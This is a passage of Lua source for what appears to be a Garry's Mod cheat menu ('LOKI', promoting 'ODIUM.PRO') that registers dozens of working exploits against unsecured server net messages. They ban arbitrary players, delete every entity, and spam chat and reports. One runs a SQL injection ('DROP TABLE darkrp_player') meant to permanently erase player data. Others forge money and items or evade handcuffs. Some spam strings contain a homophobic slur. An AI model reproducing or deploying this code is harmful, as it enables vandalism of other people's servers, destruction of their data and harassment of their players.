        { typ = "entity", addr = "px_ply", Name = "Printer", tbl = function() return LOKI.ents.FindByGlobal("data") end },
        { typ = "func", Name = "Edit", },
    },
} )
LOKI.AddExploit( "Printer Exploit", {
    desc = "Edit the shelves of any printer in the server",
    severity = 65,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString( "lithiumPrinter2" ) end,
    count = {
        ["Active"] = 2,
        ["Total"] = 2,
    },
    hooks = {
        Think = function(tbl, sploit)               
            local ent = LOKI.GetStored("px2_ply", {})[1]
            if(IsValid(ent) && istable(ent.shelves)) then
                LOKI.OpenTableEditor(LOKI.Menu, ent.shelves, "Printer Shelves", function(tbl)
                    LOKI.NetStart(sploit, {"lithium_printers_connected", "lithiumPrinters2RackLarge"}, true)
                    net.WriteEntity(ent)
                    net.WriteTable(tbl)
                    net.SendToServer()
                end)
            end
            
        end,
    },
    functions = {
        { typ = "entity", addr = "px2_ply", Name = "Printer", tbl = function() return LOKI.ents.FindByGlobal("shelves") end },
        { typ = "func", Name = "Edit", },
    },
} ) 
//////////////////////////////////////////////- SPAM -////////////////////////////////////////////////
LOKI.AddExploit( "Chat Spam", {
    desc = "Spams specific players on the server with a message",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 10,
    scan = function() return (LOKI.ValidNetString( "sendtable" ) ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "fr_players", {} ) ) do
                if !IsValid(v) then continue end
                local buyit = {}
                for i = 1, 15 do
                    buyit[#buyit + 1] = LOKI.GetStored( "fr_spamstring", "GET ODIUM.PRO" )
                end
                LOKI.NetStart( sploit, "sendtable" )
                net.WriteEntity( v )
                net.WriteTable( buyit )
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "string", Name = "Enter a message", default = "GET ODIUM.PRO", addr = "fr_spamstring" },
        { typ = "players", addr = "fr_players" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Chat Spam", {
    desc = "Spam private messages to anyone",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = function(sploit) return #LOKI.GetStored( "spammer_plyz", {} ) end,
    times_per_tick = math.huge,
    vars = {},
    scan = function() 
        local psay, query = LOKI.RecursiveGetVar(ulx, {"psay"}, "function"), LOKI.RecursiveGetVar(ULib, {"ucl", "query"}, "function")
        return (psay && query && query( LOKI.GetLP(), "ulx psay" )) end,
    hooks = {
        Think = function(tbl, sploit)
            if(LOKI.GetLP().ulib_threat_level) then
                LOKI.GetLP().ulib_threat_level = 0
            end
            for k, v in ipairs( LOKI.GetStored( "spammer_plyz", {} ) ) do
                if !IsValid(v) then continue end
                local spamstr = LOKI.GetStored( "spam_message", "GET ODIUM.PRO" )
                LOKI.RCC(sploit, "ulx", "psay", v:Nick(), spamstr)
            end
        end,
    },
    functions = {
        { typ = "string", Name = "Spam Message", default = "GET ODIUM.PRO", addr = "spam_message" },
        { typ = "players", addr = "spammer_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Chat Spam", {
    desc = "Spam admin messages",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = function(sploit) return #LOKI.GetStored( "spamasay_plyz", {} ) end,
    times_per_tick = math.huge,
    vars = {},
    scan = function() 
        local asay, query = LOKI.RecursiveGetVar(ulx, {"asay"}, "function"), LOKI.RecursiveGetVar(ULib, {"ucl", "query"}, "function")
        return (asay && query && query( LOKI.GetLP(), "ulx asay" )) end,
    hooks = {
        Think = function(tbl, sploit)
            if(LOKI.GetLP().ulib_threat_level) then
                LOKI.GetLP().ulib_threat_level = 0
            end
            local spamstr = LOKI.GetStored( "spam2_message", "GET ODIUM.PRO" )
            LOKI.RCC(sploit, "ulx", "asay", spamstr)
        end,
    },
    functions = {
        { typ = "string", Name = "Spam Message", default = "GET ODIUM.PRO", addr = "spam2_message" },
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Chat Spam", {
    desc = "Set ALL taxes to 0 and spam notifies",
    severity = 50,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return LOKI.ValidNetString("BEModule_SetTaxes") && BEModuleConfig && BEModuleConfig.EnableTaxes end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "BEModule_SetTaxes")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Chat Spam", {
    desc = "Spam chat messages for everyone (except loki users)",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return LOKI.ValidNetString("DrGBaseChatPrint")  end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "DrGBaseChatPrint")
            net.WriteString(LOKI.GetStored("chatspam4", "GET ODIUM.PRO"))
            net.WriteBool(sploit.bools.error || false)
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if(strName == "DrGBaseChatPrint") then
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "string", Name = "Spam Message", default = "GET ODIUM.PRO", addr = "chatspam4" },
        { typ = "bool", ToggleText = {"Error"}, border = true, bool = "error" },
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Report Exploit", {
    desc = "Spam reports on everybody on the server",
    severity = 1,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "TransferReport" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( player.GetAll() ) do
                LOKI.NetStart( sploit, "TransferReport" )
                net.WriteString( v:SteamID() )
                net.WriteString( "INFERNUS AND BAT ARE FAGGOTS FOR EACH OTHER" )
                net.WriteString( "DITCH THIS SHITTY SERVER AND BUY ODIUM.PRO TODAY" )
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "func", Name = "Report Everybody", },
    },
} )
/*LOKI.ChatClear = LOKI.LAST.ChatClear || _G.ChatClear
LOKI.AddExploit( "Chat Spam", {
    desc = "Chat will clear and become unusable. (patched on some custom chatboxes)",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return pcall(function() require("cc") end) && istable(LOKI.ChatClear || _G.ChatClear) end,
    initial = function()
        if(!LOKI.ChatClear) then
            LOKI.ChatClear = _G.ChatClear
        end
        if(_G.ChatClear) then
            _G.ChatClear = nil
        end
    end,
    hooks = {
        Think = function(tbl, sploit)
            if(LOKI.ChatClear) then if(DarkRP) then LOKI.ChatClear.OOC() else LOKI.ChatClear.Run() end end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )*/
LOKI.AddExploit( "Team Change Spammer", {
    desc = "Chat will spam with team changes",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = function(sploit)
        local tbl = LOKI.RecursiveGetVar(sploit, {"vars", "Think", "team"}, "table", true)
        LOKI.SetTableContents(tbl, LOKI.GetVarTable(team.GetAllTeams(), "Joinable", LOKI.TYPEVARS.EQUALTO, true))
        return #tbl
    end,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return LOKI.GetLP().pkdata != nil end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.RecursiveGetVar(sploit, {"vars", "Think", "team"}, "table", true) ) do
                if(v.Joinable == true) then
                    LOKI.RCC(sploit, "_team", tostring(k))
                end
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Respawn Exploit", {
    desc = "Instantly respawn on death, skip respawn timer",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.GetLP().pkdata != nil end,
    hooks = {
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)
            if ( ent == LOKI.GetLP() ) then
                for k, v in ipairs( team.GetAllTeams() ) do
                    if(v.Joinable == true && k != LOKI.GetLP():Team()) then
                        LOKI.RCC(sploit, "_team", tostring(k))
                        break
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
/*LOKI.AddExploit( "Respawn Exploit", {
    desc = "Instantly respawn on death",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString("recreate_move") end,
    hooks = {
        entity_killed = function(tbl, sploit, varargs)
            local data = varargs[1]
            local ent = Entity(data.entindex_killed)
            if ( ent == LOKI.GetLP() ) then
                LOKI.NetStart(sploit, "recreate_move")
                net.WriteVector(LOKI.GetLP():GetPos())
                net.WriteAngle(LOKI.GetLP():GetAngles())
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )*/ --TRASH
LOKI.AddExploit( "Console Spam", {
    desc = "Supposed to be a lagsploit but doesn't actually cause lag, just spams console",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 20,
    scan = function() return ULib != nil end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.RCC(sploit,  "_u", LOKI.GetStored("consolespam1", "GET ODIUM.PRO") )
        end,
    },
    functions = {
        { typ = "string", Name = "Spam Message", default = "GET ODIUM.PRO", addr = "consolespam1" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Chat Spam", {
    desc = "Big chat spams, extremely annoying",
    severity = 1,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "VJSay" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( player.GetAll() ) do
                LOKI.NetStart( sploit, "VJSay" )
                net.WriteEntity( v )
                net.WriteString( LOKI.GetStored( "vj_spamstring", "GET ODIUM.PRO" ) )
                if LOKI.GetStored( "vj_spamsound", "" ) != "" then
                    net.WriteString( LOKI.GetStored( "vj_spamsound", "" ) )
                end
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "string", Name = "Enter a message", default = "GET ODIUM.PRO", addr = "vj_spamstring" },
        { typ = "string", Name = "Enter a sound path", default = "vo/npc/male01/hacks01.wav", addr = "vj_spamsound" },
        { typ = "bool", },
    },
} )
//////////////////////////////////////////////- HARM -////////////////////////////////////////////////
LOKI.AddExploit( "Ban Exploit", {
    desc = "Allows you to ban anyone regardless of rank",
    severity = 100,
    bools = {enabled = false},
    status = 3,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "banleaver" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k,v in ipairs(LOKI.GetStored( "banleaver_ply", {} )) do
                if IsValid(v) then
                    if(v:IsPlayer()) then
                        LOKI.NetStart( sploit, "banleaver")
                        net.WriteString(tostring(v:SteamID().."{sep}"..tostring(v:Name())))
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "banleaver_ply" },
        { typ = "bool", Name = "Ban", args = {}, },
    },
} ) 
LOKI.AddExploit( "Ban Exploit", {
    desc = "Allows you to ban anyone regardless of rank",
    severity = 100,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "gBan.BanBuffer" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k,v in ipairs(LOKI.GetStored( "ban2_ply", {} )) do
                if IsValid(v) then
                    if(v:IsPlayer()) then
                        LOKI.NetStart( sploit, "gBan.BanBuffer" )
                        net.WriteBool( true )
                        net.WriteInt( LOKI.SafeToNumber(LOKI.GetStored("ban2time", 0)), 32 )
                        net.WriteString( LOKI.GetStored("ban2", "GET ODIUM.PRO") )
                        net.WriteString( v:SteamID() )
                        net.SendToServer()
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "ban2_ply" },
        { typ = "string", Name = "Ban Reason", default = "GET ODIUM.PRO", addr = "ban2" },
        { typ = "float", Name = "Ban Time", min = 0, max = (math.pow(2, 32)-1)/2, default = 0, addr = "ban2time" },
        { typ = "bool", Name = "Ban", args = {}, },
    },
} )
LOKI.AddExploit( "Ban Exploit", {
    desc = "Allows you to ban anyone regardless of rank",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "RDMAssign" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k,v in ipairs(LOKI.GetStored( "ban3_ply", {} )) do
                if IsValid(v) then
                    if(v:IsPlayer()) then
                        for i=1, 10 do
                            LOKI.NetStart( sploit, "RDMAssign" )
                            net.WriteEntity( v )
                            net.SendToServer()
                        end
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "ban3_ply" },
        { typ = "func", Name = "Do it" },
    },
} )
LOKI.AddExploit( "Break The Server", {
    desc = "Vandalize the DarkRP master SQL database, permanently erasing all DarkRP player data",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "pplay_sendtable", "pplay_deleterow" ) && cl_PPlay end,
    hooks = {
        Think = function(tbl, sploit)
            local ass = {}
            ass.tblname = "darkrp_player; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
            ass.ply = LOKI.GetLP()
            LOKI.NetStart(sploit, "pplay_sendtable")
            net.WriteTable(ass)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Burn it down", },
    },
} ) 
LOKI.AddExploit( "Break The Server", {
    desc = "Will cause a nuclear implosion",
    severity = 100,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.ents.FindByGlobal("") ) do
                LOKI.NetStart( sploit, "MDE_RemoveStuff_C2S")
                net.WriteTable( {DATA="",TARGET=v} )
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "func", Name = "Burn it down", },
    },
} )
LOKI.AddExploit( "Break The Server", {
    desc = "Will cause a nuclear implosion",
    severity = 100,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "timebombDefuse" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.ents.FindByGlobal("") ) do
                LOKI.NetStart( sploit, "timebombDefuse")
                net.WriteEntity(v)
                net.WriteBool(true)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "func", Name = "Burn it down", },
    },
} )
LOKI.AddExploit( "Break The Server", {
    desc = "Irreversibly break the physics engine",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "dialogAlterWeapons" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "dialogAlterWeapons", true)
            net.WriteString("Add")
            net.WriteTable({[1] = "worldspawn"})
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Burn it down", },
    },
} )
LOKI.AddExploit( "Cuff Breaker", {
    desc = "Instantly break out of handcuffs",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "Kun_ZiptieStruggle" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "Kun_ZiptieStruggle")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Cuff Breaker", {
    desc = "Automatically break out of handcuffs",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return isfunction(LOKI.GetLP().IsHandcuffed) end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            local cmd = varargs[1]
            if(LOKI.GetLP().IsHandcuffed(LOKI.GetLP())) then
                if(cmd:TickCount() % 2 == 0) then
                    cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK));
                end
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Cuff Breaker", {
    desc = "Instantly break out of handcuffs",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString("realistic_hook BreakFree") end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            local cmd = varargs[1]
            local target_ents = LOKI.GetVarTable(ents.GetAll(), "GetTargetEnt", LOKI.TYPEVARS.EQUALTO, LOKI.GetLP())
            if(target_ents[1]) then
                if(cmd:TickCount() % 2 == 0) then
                    cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_USE));
                end
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Cuff Breaker", {
    desc = "Instantly break out of handcuffs",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return isfunction(LOKI.GetLP().IsHandcuffed) && LOKI.ValidNetString("dialogAlterWeapons") end,
    hooks = {
        Think = function(tbl, sploit)
            if(LOKI.GetLP():IsHandcuffed()) then
                LOKI.NetStart( sploit, "dialogAlterWeapons", true)
                net.WriteString("Remove")
                net.WriteTable({[1] = "weapon_handcuffed"})
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Entity Exploit", {
    desc = "Unfreeze any entity",
    severity = 50,
    bools = {enabled = false},
    status = 2,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString("zrush_FuelSplitUIGotClosed_net") end,
    hooks = {
        CreateMove = function(tbl, sploit, varargs)
            local tbl = LOKI.RecursiveGetVar(sploit, {"bools"}, "table", true)
            if(tbl.enabled) then
                local ent = LOKI.GetLP():GetEyeTrace().Entity
                if(IsValid(ent) && varargs[1]:KeyDown(IN_ATTACK)) then
                    LOKI.NetStart(sploit, "zrush_FuelSplitUIGotClosed_net")
                    net.WriteFloat(ent:EntIndex())
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Entity Exploit", {
    desc = "Give yourself any entity",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "CRAFTINGMOD_INVENTORY" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local vars = LOKI.RecursiveGetVar(sploit, {"vars"}, "table", true)
            if(!vars.NAME) then
                local ItemsList = LOKI.RecursiveGetVar(CRAFTINGMOD, {"ITEMS", "GetItemsList"}, "function")
                if(ItemsList) then
                    for k, v in pairs(ItemsList(CRAFTINGMOD.ITEMS)) do
                        if(!v.LoadData) then
                            vars.NAME = v.NAME
                            break
                        end
                    end
                end
            end
            for i = 1, LOKI.GetStored("entity1_q") do
                LOKI.NetStart(sploit, "CRAFTINGMOD_INVENTORY", true)
                net.WriteTable({type = 6, ENTITY = LOKI.GetStored( "entity1" ), SKIN = 0, MODEL = LOKI.GetStored("entity1_m"), NAME = vars.NAME || "Beer"})
                net.WriteInt(0, 16)
                net.WriteString(tostring(LOKI.RecursiveGetVar(CRAFTINGMOD, {"PANELS", "Inventory_ID"}, "string") || 0))
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "string", Name = "Entity Class", default = "sent_ball", addr = "entity1" },
        { typ = "string", Name = "Entity Model", default = "models/error.mdl", addr = "entity1_m" },
        { typ = "float", addr = "entity1_q", Name = "Amount", min = 1, max = LOKI.RecursiveGetVar(_G, {"CRAFTINGMOD", "Config", "PropLimit"}, "number") || math.huge, default = 1 },
        { typ = "func", Name = "Give me shit", },
    },
} )
LOKI.AddExploit( "Entity Exploit", {
    desc = "With just a wave of my magic wand...",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("STOOL_FISHSPOT_REMOVE") end,
    hooks = {
        net = {
            SendToServer = function(sploit, varargs, func)
                func(unpack(varargs))
                if(sploit.bools.enabled && LOKI.NetOutgoingMsg == "properties" && istable(LOKI.NetOutgoingData[1]) && LOKI.NetOutgoingData[1][1] == LOKI.GetStored("util_jack1", "remove")) then
                    LOKI.NetStart(sploit, "STOOL_FISHSPOT_REMOVE")
                    net.WriteEntity(Entity(LOKI.NetOutgoingData[2][1]))
                    net.SendToServer()
                end
                return false
            end,
        },
        /*_G = {
            SortedPairsByMemberValue = function(sploit, varargs, func)
                local PropertyList = varargs[1]
                if(istable(PropertyList) && PropertyList["remove"] && PropertyList["remove"]["Filter"] && sploit.bools.enabled) then
                    local tbl = table.Copy(PropertyList)
                    tbl["remove"]["Filter"] = function() return true end
                    return func(unpack(varargs))
                end
            end,
        },*/
    },
    functions = {
        { typ = "string", Name = "Utility", default = "remove", addr = "util_jack1" },
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Entity Exploit", {
    desc = "Some disassembly required",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("DestroyTable") end,
    hooks = {
        net = {
            SendToServer = function(sploit, varargs, func)
                func(unpack(varargs))
                if(sploit.bools.enabled && LOKI.NetOutgoingMsg == "properties" && istable(LOKI.NetOutgoingData[1]) && LOKI.NetOutgoingData[1][1] == LOKI.GetStored("util_jack2", "remove")) then
                    LOKI.NetStart(sploit, "DestroyTable")
                    net.WriteEntity(Entity(LOKI.NetOutgoingData[2][1]))
                    net.SendToServer()
                end
                return false
            end,
        },
    },
    functions = {
        { typ = "string", Name = "Utility", default = "remove", addr = "util_jack2" },
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Entity Exploit", {
    desc = "Set your playermodel to anything",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "SetPlayerModel" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "SetPlayerModel")
            net.WriteString(LOKI.GetStored( "entity2_m" ))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Model", default = "models/error.mdl", addr = "entity2_m" },
        { typ = "func", Name = "Do it", },
    },
} )
LOKI.AddExploit( "Entity Exploit", {
    desc = "Take a sip from the cup of destruction",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("AS_DoAttack") end,
    hooks = {
        net = {
            SendToServer = function(sploit, varargs, func)
                func(unpack(varargs))
                if(sploit.bools.enabled && LOKI.NetOutgoingMsg == "properties" && istable(LOKI.NetOutgoingData[1]) && LOKI.NetOutgoingData[1][1] == LOKI.GetStored("util_jack3", "remove")) then
                    LOKI.NetStart(sploit, "AS_DoAttack")
                    net.WriteTable({Weapon = Entity(LOKI.NetOutgoingData[2][1]):EntIndex(), Target = 0})
                    net.SendToServer()
                end
                return false
            end,
        },
    },
    functions = {
        { typ = "string", Name = "Utility", default = "remove", addr = "util_jack3" },
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Entity Exploit", {
    desc = "Give yourself any entity",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "dialogAlterWeapons" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(string.Split( LOKI.GetStored("entity2", "sent_ball"), "," )) do
                for i = 1, LOKI.GetStored("entity2_q") do
                    LOKI.NetStart(sploit, "dialogAlterWeapons", true)
                    net.WriteString("Add")
                    net.WriteTable({[1] = v})
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "string", Name = "Entity Class", default = "sent_ball", addr = "entity2" },
        { typ = "float", addr = "entity2_q", Name = "Amount", min = 1, max = math.huge, default = 1 },
        { typ = "func", Name = "Give me shit", },
    },
} )
LOKI.AddExploit( "Entity Exploit", {
    desc = "Spawn any inventory item",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    prevalidated = true,
    scan = function()
        local ret = LOKI.ValidNetString( "InvSV" ) && istable(Items)
        if(ret) then
            for k, v in pairs(Items) do
                v.ClassName = k
            end
        end
        return ret
    end,
    hooks = {
        Think = function(tbl, sploit)
            for i = 1, LOKI.GetStored("entity3_q") do
                LOKI.NetStart( sploit, "InvSV", true )
                net.WriteTable({})
                net.WriteString("DropItem")
                net.WriteString(LOKI.GetStored("entity3", "")[1])
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "combo", Name = "Entity", tbl = Items, var = "ClassName", sort = "ClassName", default = {}, addr = "entity3" },
        { typ = "float", addr = "entity3_q", Name = "Amount", min = 1, max = math.huge, default = 1 },
        { typ = "func", Name = "Spawn", },
    },
} )
LOKI.AddExploit( "Entity Exploit", {
    desc = "Become invisible",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    general_override = true,
    scan = function()
        return LOKI.ValidNetString( "camo_PlayerInvis" )
    end,
    OnEnable = function(var, sploit)
        if(var != "invisible") then return end
        LOKI.NetStart( sploit, "camo_PlayerInvis", true )
        net.WriteBool( true )
        net.SendToServer()
    end,
    OnDisable = function(var, sploit)
        if(var != "invisible") then return end
        LOKI.NetStart( sploit, "camo_PlayerInvis", true )
        net.WriteBool( false )
        net.SendToServer()
    end,
    functions = {
        { typ = "bool", ToggleText = {"Cloak"}, border = true, bool = "invisible" },
    },
} )
LOKI.AddExploit( "Movement Exploit", {
    desc = "My name is Barry Allen...",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString("XMH_RunOneLineLua") end,
    count = {
        ["Active"] = 3,
        ["Total"] = 3,
    },
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "XMH_RunOneLineLua")
            net.WriteString("xmh_walkspeed_var")
            net.WriteInt(LOKI.GetStored("dbx_wlk"), 16)
            net.SendToServer()
            LOKI.NetStart(sploit, "XMH_RunOneLineLua")
            net.WriteString("xmh_runspeed_var")
            net.WriteInt(LOKI.GetStored("dbx_run"), 16)
            net.SendToServer()
            LOKI.NetStart(sploit, "XMH_RunOneLineLua")
            net.WriteString("xmh_jumpheight_var")
            net.WriteInt(LOKI.GetStored("dbx_jmp"), 16)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Walk Speed", min = 1, max = math.floor(2^16 / 2)-1, default = 160, addr = "dbx_wlk" },
        { typ = "float", Name = "Run Speed", min = 1, max = math.floor(2^16 / 2)-1, default = 240, addr = "dbx_run" },
        { typ = "float", Name = "Jump Height", min = 1, max = math.floor(2^16 / 2)-1, default = 200, addr = "dbx_jmp" },
        { typ = "func", Name = "Do it"},
    },
} )
LOKI.AddExploit( "Movement Exploit", {
    desc = "Become a triathlon runner",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    prevalidated = true,
    scan = function() return LOKI.ValidNetString("StaminaDrowning") && LOKI.GetLP().BurgerStamina != nil && LOKI.GetLP().BurgerMaxStamina != nil end,
    hooks = {
        CreateMove = function()
            LOKI.GetLP().BurgerStamina = LOKI.GetLP().BurgerMaxStamina
        end,
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Movement Exploit", {
    desc = "Become a triathlon runner",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return isfunction(StopSprint) && LOKI.GetLP():GetNWInt( "stamina", false ) != false end,
    vars = {stamina = 0},
    hooks = {
        Tick = function(tbl, sploit)
            LOKI.GetLP():SetNWInt( "stamina", math.huge )
        end,
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Vandalize Server Data", {
    desc = "Vandalize the servers data folder, probably won't do any real damage but will annoy their devs",
    severity = 90,
    bools = {enabled = false},
    status = 2,
    times_per_tick = math.huge,
    vars = {},
    scan = function() return LOKI.ValidNetString( "WriteQuery" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "WriteQuery" )
            net.WriteString( "BUY ODIUM.PRO"..string.rep( "!", math.random( 1, 50 ) ) )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Give people a crapton of money",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "SendMoney" ) && net.Receivers["confpanel"] end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "shekels1_plyz", {} ) ) do
                if IsValid(v) then
                    LOKI.NetStart( sploit, "SendMoney" )
                    net.WriteEntity( v )
                    net.WriteEntity( v )
                    net.WriteEntity( v )
                    net.WriteString( tostring(-LOKI.SafeToNumber(LOKI.GetStored( "shekels1" ))) )
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "shekels1_plyz" },
        { typ = "float", Name = "Amount", min = 1, max = 100000, default = 1000, addr = "shekels1" },
        { typ = "func", Name = "Give shekels", },
    },
} )
LOKI.AddExploit( "Money Exploit", {
    desc = "Give yourself a crapton of money",
    severity = 50,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "BailOut" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "BailOut" )
            net.WriteEntity( LOKI.GetLP() )
            net.WriteEntity( LOKI.GetLP() )
            net.WriteFloat( -LOKI.SafeToNumber(LOKI.GetStored( "shekels2" )) )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "float", Name = "Amount", min = 1, max = 100000, default = 1000, addr = "shekels2" },
